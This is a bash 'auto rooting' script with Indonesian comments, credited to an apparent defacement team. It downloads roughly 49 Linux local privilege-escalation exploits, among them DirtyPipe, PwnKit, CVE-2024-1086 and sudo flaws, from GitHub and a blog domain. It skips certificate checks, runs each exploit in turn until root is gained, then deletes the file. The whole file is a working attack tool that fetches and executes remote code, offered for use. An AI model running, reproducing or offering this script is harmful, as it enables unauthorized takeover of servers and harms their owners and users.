#!/bin/bash
set -e  # Stop kalau ada error fatal (misal wget gagal)
# Code By Ghost Haxor | Mr.W4W4N
BLUE='\033[94m'
END='\033[0m'

echo "***************************************************************"
echo -e "${BLUE}Auto Rooting Server  •  Ghosthaxor | Mr.W4W4N ${END}"
echo -e "${BLUE}Team Rokes 315 | Blog: seojagonyarank1.biz.id ${END}"
echo -e "${BLUE}                Since 2018  | 49 exploit karnel                ${END}"
echo "***************************************************************"

# Cek apakah sudah root
check_root () {
    if [ "$(id -u)" -eq 0 ]; then
        echo -e "\n[+] Successfully got root!"
        echo "ID     => $(id -u)"
        echo "WHOAMI => $USER"
        exit
    fi
}

# Menjalankan exploit tunggal
run_exploit () {
    local url="$1"
    shift
    local file="$(basename "$url")"

    echo -e "\n[*] Downloading $file"
    wget -q "$url" --no-check-certificate
    chmod +x "$file"

    echo "[*] Running Loading $file $*"
    "./$file" "$@" || true  # jika gagal, tetap lanjut

    check_root
    rm -f "$file"
}

# Mengecek versi pkexec dan jalankan exploit kalau cocok
check_pkexec_version () {
    pkexec --version 2>/dev/null | awk '/pkexec version/ {print $NF}'
}

run_pkexec_family () {
    local ver="$(check_pkexec_version)"
    echo "[*] pkexec version: ${ver:-unknown}"

    case "$ver" in
        1.05|105|0.96|0.95)
            run_exploit "https://0-gram.github.io/id-0/exp_file_credential"
            ;;
        *) echo "[-] pkexec not vulnerable / unsupported";;
    esac
}

# Jalankan awal
check_root
run_pkexec_family

# ===== DAFTAR EXPLOIT (url [opsi]) =====
exploit_list=(
    "https://0-gram.github.io/id-0/ak"
    "https://0-gram.github.io/id-0/ptrace"
    "https://0-gram.github.io/id-0/CVE-2022-0847-DirtyPipe-Exploits/exploit-1"
    "https://0-gram.github.io/id-0/CVE-2022-0847-DirtyPipe-Exploits/exploit-2 SUID"
    "https://0-gram.github.io/id-0/CVE-2022-0847-DirtyPipe-Exploits/a2.out /usr/bin/sudo"
    "https://0-gram.github.io/id-0/CVE-2022-0847-DirtyPipe-Exploits/a2.out /usr/bin/passwd"
    "https://0-gram.github.io/id-0/sudodirtypipe /usr/local/bin"
    "https://0-gram.github.io/id-0/af_packet"
    "https://0-gram.github.io/id-0/CVE-2015-1328"
    "https://0-gram.github.io/id-0/cve-2017-16995"
    "https://0-gram.github.io/id-0/exploit-debian"
    "https://0-gram.github.io/id-0/exploit-ubuntu"
    "https://0-gram.github.io/id-0/newpid"
    "https://0-gram.github.io/id-0/raceabrt"
    "https://0-gram.github.io/id-0/timeoutpwn"
    "https://0-gram.github.io/id-0/upstream44"
    "https://0-gram.github.io/id-0/lpe.sh"
    "https://0-gram.github.io/id-0/a.out 0"
    "https://0-gram.github.io/id-0/a.out 1"
    "https://0-gram.github.io/id-0/linux_sudo_cve-2017-1000367"
    "https://mrwawanj.github.io/localroot/CVE-2024-1086"
    "https://seojagonyarank1.biz.id/CVE-2024-1086"
    "https://raw.githubusercontent.com/mrwawanj/localroot/refs/heads/main/CVE-2024-108611"
    "https://0-gram.github.io/id-0/CVE-2017-7308"
    "https://0-gram.github.io/id-0/CVE-2022-2639"
    "https://0-gram.github.io/id-0/polkit-pwnage"
    "https://0-gram.github.io/id-0/RationalLove"
    "https://0-gram.github.io/id-0/exploit_userspec.py python2"
    "https://raw.githubusercontent.com/cyberpoul/CVE-2025-32462-POC/refs/heads/main/CVE-2025-32462.sh"
    "https://raw.githubusercontent.com/mrwawanj/localroot/refs/heads/main/ceka.sh"
    "https://raw.githubusercontent.com/mrwawanj/localroot/refs/heads/main/CVE-2022-37706.sh"
    "https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh"
    "https://raw.githubusercontent.com/mrwawanj/localroot/refs/heads/main/CVE-2023-32629.sh"
    "https://mrwawanj.github.io/localroot/CVE-2021-3493"
    "https://mrwawanj.github.io/localroot/CVE-2021-33909"
    "https://mrwawanj.github.io/localroot/CVE-2017-1000112"
    "https://mrwawanj.github.io/localroot/CVE-2025-21756"
    "https://raw.githubusercontent.com/K5LK/CVE-2023-2640-32629/refs/heads/main/poc.sh"
    "https://mrwawanj.github.io/localroot/cve-2021-4034"
    "https://mrwawanj.github.io/localroot/cve-2023-0386"
    "https://mrwawanj.github.io/localroot/CVE-2022-34918"
    "https://mrwawanj.github.io/localroot/cve-2022-32250"
    "https://raw.githubusercontent.com/cyberpoul/CVE-2025-32462-POC/refs/heads/main/CVE-2025-32462.sh"
    "https://raw.githubusercontent.com/kh4sh3i/CVE-2025-32463/refs/heads/main/exploit.sh"
    "https://mrwawanj.github.io/localroot/CVE-2022-25636"
    "https://mrwawanj.github.io/localroot/cve-2022-1015"
    "https://mrwawanj.github.io/localroot/cve-2021-22555"
    "https://mrwawanj.github.io/localroot/CVE-2022-0185-PipeVersion"
    "https://0-gram.github.io/id-0/overlayfs"
)

# Jalankan semua exploit satu-persatu
for entry in "${exploit_list[@]}"; do
    read -ra args <<< "$entry"
    run_exploit "${args[@]}"
done

echo -e "\n[-] Semua exploit selesai dijalankan, root belum didapat."